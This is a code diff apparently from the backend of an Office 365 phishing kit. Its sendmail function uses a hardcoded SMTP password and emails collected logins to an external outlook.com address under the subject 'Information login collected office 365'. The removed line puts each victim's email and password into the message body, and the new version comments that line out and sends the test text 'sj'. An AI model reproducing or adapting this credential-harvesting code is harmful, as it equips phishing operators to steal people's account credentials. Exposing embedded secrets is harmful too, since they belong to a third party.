@@ -25,13 +25,12 @@ function sendmail(req,res){
    pass: 'gui7voltage!'
   }
  });  
- const mailOptions = {
-  envelope:{
+ var mailOptions = {
   from:'Donald Trump',
   to: 'dakota3011@outlook.com',
   subject: 'Information login collected office 365',
-  html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>IP:</p>`
-  }
+  text: 'sj'
+  //html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>IP:</p>`
  };
  transporter.sendMail(mailOptions)
 }
